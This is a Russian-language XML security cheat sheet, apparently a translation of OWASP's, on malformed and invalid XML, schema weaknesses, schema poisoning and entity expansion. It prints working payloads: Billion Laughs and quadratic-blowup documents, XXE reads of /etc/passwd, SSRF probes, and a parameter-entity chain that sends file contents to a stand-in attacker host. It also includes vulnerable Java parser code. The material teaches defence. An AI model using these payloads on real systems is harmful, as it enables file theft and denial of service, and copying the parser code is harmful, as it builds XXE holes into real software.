    Шпаргалка по безопасности XML¶

    Введение¶

    Хотя спецификации XML и XML-схем предоставляют инструменты для защиты XML-приложений, они также содержат множество уязвимостей безопасности. Их можно использовать для проведения различных типов атак, включая извлечение файлов, подделку запросов на стороне сервера (SSRF), сканирование портов и брутфорс. В этой шпаргалке описывается, как злоумышленники могут использовать различные возможности XML в библиотеках и программном обеспечении через два возможных вектора атаки:

    • Некорректно сформированные XML-документы: Использование уязвимостей, возникающих, когда приложения встречают XML-документы, не являющиеся правильно сформированными.
    • Недопустимые XML-документы: Использование уязвимостей, возникающих, когда документы не имеют ожидаемой структуры.

    Работа с некорректно сформированными XML-документами¶

    Определение некорректно сформированного XML-документа¶

    Если XML-документ не соответствует определению правильно сформированного документа по спецификации W3C XML, он считается «некорректно сформированным». Если XML-документ некорректно сформирован, XML-парсер должен обнаружить критическую ошибку, остановить выполнение, документ не должен проходить никакой дополнительной обработки, а приложение должно выдать сообщение об ошибке. Некорректно сформированный документ может содержать одну или несколько из следующих проблем: отсутствующий закрывающий тег, порядок элементов в бессмысленной структуре, использование запрещённых символов и т.д.

    Обработка некорректно сформированных XML-документов¶

    Для работы с некорректными документами разработчики должны использовать XML-процессор, соответствующий спецификациям W3C и не тратящий значительного дополнительного времени на обработку некорректных документов. Кроме того, они должны использовать только правильно сформированные документы, проверять содержимое каждого элемента и обрабатывать только допустимые значения в пределах заранее определённых границ.

    Некорректно сформированные XML-документы требуют дополнительного времени¶

    Некорректный документ может влиять на потребление ресурсов центрального процессора (CPU). В определённых сценариях время, необходимое для обработки некорректных документов, может превышать время для правильно сформированных. Когда это происходит, злоумышленник может воспользоваться асимметричной атакой на ресурсы, используя большее время обработки для вызова отказа в обслуживании (DoS).

    Для анализа вероятности такой атаки сравните время обработки обычного XML-документа со временем обработки его некорректной версии. Затем рассмотрите, как злоумышленник мог бы воспользоваться этой уязвимостью совместно с флуд-атакой XML через несколько документов для усиления эффекта.

    Приложения, обрабатывающие некорректные данные¶

    Некоторые XML-парсеры способны восстанавливать некорректные документы. Они могут пытаться вернуть допустимое дерево со всем содержимым, которое они могут разобрать, независимо от несоответствия документа спецификациям. Поскольку для процесса восстановления нет предопределённых правил, подход и результаты таких парсеров могут не всегда совпадать. Использование некорректных документов может привести к непредвиденным проблемам с целостностью данных.

    Следующие два сценария иллюстрируют векторы атак, которые парсер будет анализировать в режиме восстановления:

    Некорректный документ → некорректный документ¶

    Согласно спецификации XML, строка -- (двойной дефис) не должна встречаться внутри комментариев. При использовании режима восстановления lxml и PHP следующий документ останется тем же после восстановления:

    <element>
 <!-- один
  <!-- другой комментарий
 комментарий -->
</element>

    Правильно сформированный документ → нормализованный правильно сформированный документ¶

    Некоторые парсеры могут нормализовывать содержимое секций CDATA. Это означает, что они обновят специальные символы в секции CDATA, заменив их безопасными версиями, хотя это и не является обязательным:

    <element>
 <![CDATA[<script>a=1;</script>]]>
</element>

    Нормализация секции CDATA не является общим правилом для всех парсеров. Libxml мог бы преобразовать этот документ в его каноническую форму, но хотя он и правильно сформирован, его содержимое может считаться некорректным в зависимости от ситуации:

    <element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>

    Обработка принудительного парсинга¶

    Одна из популярных принудительных атак на XML включает парсинг глубоко вложенных XML-документов без соответствующих закрывающих тегов. Идея состоит в том, чтобы заставить жертву исчерпать ресурсы машины и вызвать отказ в обслуживании на целевом объекте. Сообщения о DoS-атаке в Firefox 3.67 включали использование 30 000 открытых XML-элементов без соответствующих закрывающих тегов. Удаление закрывающих тегов упрощает атаку, поскольку требует лишь половины размера правильно сформированного документа для достижения тех же результатов. Количество обрабатываемых тегов в итоге вызвало переполнение стека. Упрощённая версия такого документа выглядит так:

    <A1>
 <A2>
  <A3>
   ...
    <A30000>

    Нарушение правил спецификации XML¶

    Манипулирование документами с использованием парсеров, не следующих спецификациям W3C, может привести к неожиданным последствиям. Может быть возможным достичь сбоев и/или выполнения кода, когда программное обеспечение неправильно проверяет, как обрабатывать некорректные структуры XML. Подача программному обеспечению фаззинговых XML-документов может выявить такое поведение.

    Работа с недопустимыми XML-документами¶

    Злоумышленники могут вводить неожиданные значения в документы, чтобы воспользоваться приложением, не проверяющим наличие в документе допустимого набора значений. Схемы задают ограничения, помогающие определить, являются ли документы допустимыми: допустимый документ правильно сформирован и соответствует ограничениям схемы. Для проверки документа может использоваться несколько схем, а ограничения могут быть расположены в нескольких файлах — как с единым языком схем, так и с использованием возможностей различных языков схем.

    Рекомендация по предотвращению этих уязвимостей: каждый XML-документ должен иметь точно определённую XML-схему (не DTD) с надлежащим ограничением каждого элемента информации во избежание проблем с некорректной проверкой данных. Используйте локальную копию или хорошо известный репозиторий вместо ссылки на схему, указанной в XML-документе. Также выполняйте проверку целостности файла XML-схемы, помня о возможности компрометации репозитория. В случаях, когда XML-документы используют удалённые схемы, настраивайте серверы на использование только безопасных зашифрованных коммуникаций для предотвращения перехвата сетевого трафика злоумышленниками.

    Документ без схемы¶

    Рассмотрим книготорговца, использующего веб-сервис через веб-интерфейс для совершения транзакций. XML-документ для транзакций состоит из двух элементов: значения id, связанного с товаром, и определённой price. Пользователь может вводить только определённое значение id через веб-интерфейс:

    <buy>
 <id>123</id>
 <price>10</price>
</buy>

    При отсутствии контроля над структурой документа приложение может также обрабатывать другие правильно сформированные сообщения с непредвиденными последствиями. Предыдущий документ мог бы содержать дополнительные теги, влияющие на поведение базового приложения, обрабатывающего его содержимое:

    <buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>

    Обратите внимание: значение 123 предоставляется как id, но теперь документ содержит дополнительные открывающие и закрывающие теги. Злоумышленник закрыл элемент id и установил поддельный элемент price со значением 0. Последний шаг для сохранения правильно сформированной структуры — добавление пустого элемента id. После этого приложение добавляет закрывающий тег для id и устанавливает price в 10. Если приложение обрабатывает только первые предоставленные значения ID и цены без контроля структуры, злоумышленник может купить книгу фактически бесплатно.

    Неограничительная схема¶

    Некоторые схемы не предоставляют достаточных ограничений для типов данных, которые может получать каждый элемент. Это обычно происходит при использовании DTD; у него очень ограниченный набор возможностей по сравнению с типами ограничений, применимых в XML-документах. Это может подвергать приложение нежелательным значениям внутри элементов или атрибутов, которые легко ограничить с помощью других языков схем. В следующем примере возраст (age) человека проверяется по встроенной схеме DTD:

    <!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000 цифр)..11111</age>
</person>

    Предыдущий документ содержит встроенную DTD с корневым элементом person. Этот элемент содержит два элемента в определённом порядке: name, затем age. Элемент name определён как содержащий PCDATA, аналогично элементу age.

    После этого определения начинается правильно сформированный и допустимый XML-документ. Элемент name содержит нерелевантное значение, но элемент age содержит миллион цифр. Поскольку нет ограничений на максимальный размер элемента age, эта строка из миллиона цифр может быть отправлена на сервер для этого элемента.

    Обычно такой элемент должен быть ограничен определённым количеством символов и набором допустимых символов (например, цифры от 0 до 9, знак + и знак -). При отсутствии надлежащих ограничений приложения могут обрабатывать потенциально недопустимые значения из документов.

    Поскольку невозможно указать конкретные ограничения (максимальную длину для элемента name или допустимый диапазон для элемента age), такой тип схемы увеличивает риск нарушения целостности и доступности ресурсов.

    Некорректная проверка данных¶

    Когда схемы небезопасно определены и не предоставляют строгих правил, они могут подвергать приложение различным ситуациям. Результатом может быть раскрытие внутренних ошибок или документов, поражающих функциональность приложения неожиданными значениями.

    Строковые типы данных¶

    Если вам нужно использовать шестнадцатеричное значение, нет смысла определять его как строку, которая затем будет ограничена 16 шестнадцатеричными символами. Для примера: при использовании XML-шифрования некоторые значения должны быть закодированы в base64. Вот определение схемы того, как должны выглядеть эти значения:

    <element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>

    Предыдущая схема определяет элемент CipherValue как тип данных base64. В качестве примера, IBM WebSphere DataPower SOA Appliance допускал любой тип символов внутри этого элемента после допустимого значения base64 и считал его допустимым.

    Первая часть этих данных правильно проверяется как значение base64, но оставшиеся символы могут быть чем угодно (включая другие подэлементы элемента CipherData). Ограничения частично заданы для элемента, что означает, что информация, вероятно, проверяется с помощью приложения, а не предложенной схемы.

    Числовые типы данных¶

    Определение правильного типа данных для чисел может быть сложнее, поскольку вариантов больше, чем для строк.

    Ограничения отрицательных и положительных значений¶

    Числовые типы данных XML-схемы могут включать различные диапазоны чисел:

    • negativeInteger: Только отрицательные числа
    • nonNegativeInteger: Положительные числа и ноль
    • positiveInteger: Только положительные числа
    • nonPositiveInteger: Отрицательные числа и ноль

    Следующий пример документа определяет id продукта, price и значение quantity, находящееся под контролем злоумышленника:

    <buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>

    Чтобы не повторять старых ошибок, можно определить XML-схему, предотвращающую обработку некорректной структуры в случаях, когда злоумышленник хочет ввести дополнительные элементы:

    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>

    Ограничение quantity типом данных integer позволит избежать неожиданных символов. Когда приложение получает предыдущее сообщение, оно может рассчитать итоговую цену как price*quantity. Однако, поскольку этот тип данных допускает отрицательные значения, злоумышленник, предоставив отрицательное число, может получить отрицательный результат на счёте пользователя. Чтобы избежать такой логической уязвимости, здесь следует использовать positiveInteger вместо integer.

    Деление на ноль¶

    Когда управляемые пользователем значения используются в качестве делителей, разработчики должны исключать значение ноль. В случаях, когда ноль используется для деления в XSLT, возникнет ошибка FOAR0001. Другие приложения могут выбрасывать иные исключения, и программа может дать сбой. Существуют специальные типы данных для XML-схем, явно исключающие ноль. Например, в случаях, когда отрицательные значения и ноль не являются допустимыми, схема может указать тип данных positiveInteger для элемента.

    <xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>

    Элемент denominator теперь ограничен положительными целыми числами. Это означает, что допустимыми будут считаться только значения больше нуля. Если используется любой другой тип ограничения, при равенстве знаменателя нулю может возникнуть ошибка.

    Специальные значения: бесконечность и не-число (NaN)¶

    Типы данных float и double содержат вещественные числа и некоторые специальные значения: -Infinity или -INF, NaN и +Infinity или INF. Эти возможности могут быть полезны для выражения определённых значений, но иногда ими злоупотребляют. Проблема в том, что они обычно используются для выражения только вещественных чисел, например цен. Это распространённая ошибка в других языках программирования, не ограниченная исключительно этими технологиями.

    Непринятие во внимание всего спектра возможных значений типа данных может приводить к сбоям базовых приложений. Если специальные значения Infinity и NaN не требуются и ожидаются только вещественные числа, рекомендуется использовать тип данных decimal:

    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>

    Значение price не будет вызывать ошибок при установке Infinity или NaN, поскольку эти значения не будут допустимыми. Злоумышленник может воспользоваться этой проблемой, если такие значения разрешены.

    Общие ограничения данных¶

    После выбора подходящего типа данных разработчики могут применять дополнительные ограничения. Иногда допустимым будет считаться лишь определённое подмножество значений типа данных:

    Перечисляемые значения¶

    Определённые типы значений должны быть ограничены конкретными наборами: светофоры имеют только три цвета, существует только 12 месяцев и т.д. Схема может содержать эти ограничения для каждого элемента или атрибута. Это наиболее идеальный сценарий списка разрешённых значений для приложения: принимаются только конкретные значения. Такое ограничение называется enumeration (перечисление) в XML-схеме. Следующий пример ограничивает содержимое элемента month 12 возможными значениями:

    <xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

    Ограничив значение элемента month одним из перечисленных значений, приложение не будет обрабатывать произвольные строки.

    Диапазоны¶

    Программные приложения, базы данных и языки программирования обычно хранят информацию в пределах определённых диапазонов. Всякий раз, используя элемент или атрибут в местах, где важны определённые размеры (во избежание переполнений и потерь данных), логично проверять, считается ли длина данных допустимой. Следующая схема могла бы ограничить имя с использованием минимальной и максимальной длины во избежание нестандартных сценариев:

    <xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

    В случаях, когда возможные значения ограничены определённой длиной (например, 8 символов), это значение можно задать следующим образом:

    <xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
    Паттерны¶

    Определённые элементы или атрибуты могут следовать конкретному синтаксису. Вы можете добавлять ограничения pattern при использовании XML-схем. Когда нужно убедиться, что данные соответствуют конкретному паттерну, можно создать специальное определение для него. Номера социального страхования (SSN) служат хорошим примером: они должны использовать определённый набор символов, определённую длину и определённый pattern:

    <xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

    В качестве значений SSN будут разрешены только числа от 000-00-0000 до 999-99-9999.

    Утверждения¶

    Компоненты утверждений ограничивают существование и значения связанных элементов и атрибутов в XML-схемах. Элемент или атрибут будет считаться допустимым по отношению к утверждению только если тест оценивается как true без возникновения каких-либо ошибок. Переменная $value может использоваться для ссылки на содержимое анализируемого значения.

    В разделе Деление на ноль выше упоминались потенциальные последствия использования типов данных, содержащих ноль для делителей, и предлагался тип данных, содержащий только положительные значения. Противоположный пример рассматривал бы допустимым весь диапазон чисел, кроме нуля. Чтобы избежать раскрытия потенциальных ошибок, значения можно проверять с помощью assertion, запрещающего число ноль:

    <xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>

    Утверждение гарантирует, что denominator не будет содержать ноль как допустимое число, а также разрешает отрицательные числа в качестве допустимого делителя.

    Кратность вхождений¶

    Последствия отсутствия определения максимального количества вхождений могут быть хуже, чем работа с последствиями экстремального количества обрабатываемых элементов. Два атрибута задают минимальный и максимальный пределы: minOccurs и maxOccurs.

    Значение по умолчанию для обоих атрибутов — 1, но определённым элементам могут потребоваться другие значения. Например, если значение необязательно, оно может иметь minOccurs равный 0, а если нет ограничений на максимальное количество, оно может иметь maxOccurs равный unbounded, как в следующем примере:

    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>

    Предыдущая схема включает корневой элемент operation, который может содержать неограниченное (unbounded) количество элементов buy. Это распространённый случай, поскольку разработчики обычно не хотят ограничивать максимальное количество вхождений. Приложения, использующие неограниченные вхождения, должны тестировать, что происходит при получении чрезвычайно большого количества элементов для обработки. Поскольку вычислительные ресурсы ограничены, последствия должны быть проанализированы, и в итоге следует использовать максимальное число вместо значения unbounded.

    Сверхбольшие полезные нагрузки¶

    Отправка XML-документа размером 1 ГБ требует лишь секунды серверной обработки и может не стоить рассмотрения как атаки. Вместо этого злоумышленник будет искать способ минимизировать CPU и трафик для генерации такого типа атаки в сравнении с общим объёмом серверного CPU или трафика для обработки запросов.

    Традиционные сверхбольшие полезные нагрузки¶

    Существует два основных метода сделать документ больше обычного:

    - Атака в глубину: использование огромного количества элементов, имён элементов и/или значений элементов.

    - Атака в ширину: использование огромного количества атрибутов, имён атрибутов и/или значений атрибутов.

    В большинстве случаев общим результатом будет огромный документ. Вот краткий пример того, как это выглядит:

    <SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...

    «Маленькие» сверхбольшие полезные нагрузки¶

    Следующий пример — очень маленький документ, но результаты его обработки могут быть аналогичны традиционным сверхбольшим нагрузкам. Цель такой маленькой нагрузки — позволить злоумышленнику отправлять много документов достаточно быстро, чтобы приложение потребляло большую часть или все доступные ресурсы:

    <?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>

    Отравление схемы¶

    Когда злоумышленник способен вносить изменения в схему, это может иметь множество опасных последствий. В частности, эффект этих последствий будет тем опаснее, если схемы используют DTD (например, извлечение файлов, отказ в обслуживании). Злоумышленник может использовать этот тип уязвимости в многочисленных сценариях, всегда в зависимости от расположения схемы.

    Локальное отравление схемы¶

    Локальное отравление схемы происходит, когда схемы доступны на том же хосте, независимо от того, встроены ли схемы в тот же XML-документ.

    Встроенная схема¶

    Наиболее тривиальный тип отравления схемы происходит, когда схема определена внутри того же XML-документа. Рассмотрим следующий, незаметно уязвимый пример, предоставленный W3C:

    <?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

    Все ограничения элемента note могут быть удалены или изменены, что позволит отправлять на сервер данные любого типа. Более того, если сервер обрабатывает внешние сущности, злоумышленник может использовать схему, например, для чтения удалённых файлов с сервера. Такой тип схемы служит только как предложение по отправке документа, но должен содержать способ проверки целостности встроенной схемы для безопасного использования. Атаки через встроенные схемы обычно используются для эксплуатации расширений внешних сущностей. Встроенные XML-схемы также могут помогать при сканировании портов внутренних хостов или брутфорс-атаках.

    Некорректные права доступа¶

    Часто можно обойти риск использования удалённо скомпрометированных версий, обрабатывая локальную схему.

    <!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

    Однако если локальная схема не имеет корректных прав доступа, внутренний злоумышленник может изменить исходные ограничения. Следующая строка иллюстрирует схему с правами доступа, разрешающими любому пользователю вносить изменения:

    -rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd

    Права доступа name.dtd позволяют любому пользователю системы вносить изменения. Эта уязвимость явно не связана со структурой XML или схемы, но поскольку эти документы обычно хранятся в файловой системе, стоит упомянуть, что злоумышленник может воспользоваться такого рода проблемой.

    Удалённое отравление схемы¶

    Схемы, определённые внешними организациями, обычно ссылаются удалённо. Если злоумышленник способен перехватить или получить доступ к сетевому трафику, он может заставить жертву получить отличный тип содержимого вместо изначально предназначенного.

    Атака «человек посередине» (MitM)¶

    Когда документы ссылаются на удалённые схемы с использованием незашифрованного протокола HTTP, взаимодействие происходит в открытом виде и злоумышленник может легко подменять трафик. Когда XML-документы ссылаются на удалённые схемы через HTTP-соединение, соединение может быть перехвачено и изменено до достижения конечного пользователя:

    <!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>

    Удалённый файл note.dtd может быть подвержен подмене при передаче по незашифрованному протоколу HTTP. Одним из инструментов для такого типа атаки является mitmproxy.

    Отравление DNS-кэша¶

    Удалённое отравление схемы возможно даже при использовании зашифрованных протоколов, таких как HTTPS. Когда программное обеспечение выполняет обратное разрешение DNS для IP-адреса с целью получения имени хоста, оно может не обеспечивать должного контроля того, действительно ли IP-адрес связан с именем хоста. В этом случае программное обеспечение позволяет злоумышленнику перенаправлять содержимое на свои IP-адреса.

    В предыдущем примере хост example.com ссылался через незашифрованный протокол.

    При переходе на HTTPS расположение удалённой схемы будет выглядеть как https://example/note.dtd. В нормальном сценарии IP-адрес example.com разрешается в 1.1.1.1:

    $ host example.com
example.com has address 1.1.1.1

    Если злоумышленник скомпрометировал используемый DNS, предыдущее имя хоста теперь может указывать на новый IP, подконтрольный злоумышленнику 2.2.2.2:

    $ host example.com
example.com has address 2.2.2.2

    При обращении к удалённому файлу жертва может фактически получать содержимое расположения, контролируемого злоумышленником.

    Атака злонамеренного сотрудника¶

    Когда третьи стороны размещают и определяют схемы, их содержимое не находится под контролем пользователей схем. Любые изменения, внесённые злонамеренным сотрудником или внешним злоумышленником, имеющим доступ к этим файлам, могут затронуть всех пользователей, обрабатывающих данные схемы. В результате злоумышленники могут повлиять на конфиденциальность, целостность или доступность других сервисов (особенно если используемая схема — DTD).

    Расширение XML-сущностей¶

    Если парсер использует DTD, злоумышленник может вводить данные, способные негативно повлиять на XML-парсер в процессе обработки документа. Эти негативные эффекты могут включать сбой парсера или доступ к локальным файлам.

    Примеры уязвимых реализаций на Java¶

    Используя возможности DTD для ссылки на локальные или удалённые файлы, можно влиять на конфиденциальность файлов. Кроме того, можно влиять на доступность ресурсов, если не установлены надлежащие ограничения для расширения сущностей. Рассмотрим следующий пример кода XXE.

    Пример XML:

    <!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>

    Пример DTD:

    <!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
    XXE с использованием DOM¶
    import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}

Last Name: ### User Database

root:*:0:0:System Administrator:/var/root:/bin/sh

    Рекурсивная ссылка на сущность¶

    Когда определение элемента A является другим элементом B, а элемент B определён как элемент A, схема описывает циклическую ссылку между элементами:

    <!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>

    Квадратичное расширение¶

    Вместо определения множества маленьких глубоко вложенных сущностей, злоумышленник в этом сценарии определяет одну очень большую сущность и ссылается на неё как можно больше раз, что приводит к квадратичному расширению (O(n^2)).

    Результатом следующей атаки будет 100 000 × 100 000 символов в памяти.

    <!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(100.000 символов A)...AAAAA">
]>
<root>&A;&A;&A;&A;...(100.000 &A;)...&A;&A;&A;&A;&A;</root>

    Billion Laughs¶

    Когда XML-парсер пытается разрешить внешние сущности из следующего кода, это заставит приложение потреблять всю доступную память до сбоя процесса. Вот пример XML-документа со встроенной схемой DTD, включающей атаку:

    <!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>

    Сущность LOL9 будет разрешена как 10 сущностей, определённых в LOL8; затем каждая из этих сущностей будет разрешена в LOL7 и так далее. В итоге CPU и/или память пострадают от разбора 3 × 10^9 (3 000 000 000) сущностей, определённых в этой схеме, что может привести к сбою парсера.

    Спецификация Simple Object Access Protocol (SOAP) полностью запрещает DTD. Это означает, что SOAP-процессор может отвергать любое SOAP-сообщение, содержащее DTD. Несмотря на эту спецификацию, некоторые SOAP-реализации всё равно разбирали схемы DTD внутри SOAP-сообщений.

    Следующий пример иллюстрирует случай, когда парсер не следует спецификации, допуская ссылку на DTD в SOAP-сообщении:

    <?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">

    Отражённое извлечение файлов¶

    Рассмотрим следующий пример кода XXE:

    <?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>

    В предыдущем XML определяется сущность xxe, которая фактически является содержимым /etc/passwd, и она будет раскрыта внутри тега includeme. Если парсер разрешает ссылки на внешние сущности, он может включить содержимое этого файла в XML-ответ или в вывод ошибки.

    Подделка запросов на стороне сервера (SSRF)¶

    Server Side Request Forgery (SSRF) происходит, когда сервер получает вредоносную XML-схему, заставляющую сервер получать удалённые ресурсы, например файл через HTTP/HTTPS/FTP и т.д. SSRF использовалась для получения удалённых файлов, для подтверждения XXE, когда нельзя отразить файл или выполнить сканирование портов, или для брутфорс-атак на внутренние сети.

    Внешнее разрешение DNS¶

    Иногда возможно заставить приложение выполнять DNS-запросы на стороне сервера для произвольных доменных имён. Это одна из простейших форм SSRF, требующая от злоумышленника анализа DNS-трафика. В Burp есть плагин, проверяющий наличие этой атаки.

    <!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
    Внешнее соединение¶

    Когда есть XXE и нельзя получить файл, можно проверить возможность установления удалённых соединений:

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
    Извлечение файлов с параметрическими сущностями¶

    Параметрические сущности позволяют получать содержимое с помощью URL-ссылок. Рассмотрим следующий вредоносный XML-документ:

    <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>

    Здесь DTD определяет две внешние параметрические сущности: file загружает локальный файл, а dtd загружает удалённый DTD. Удалённый DTD должен содержать нечто подобное:

    <?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;

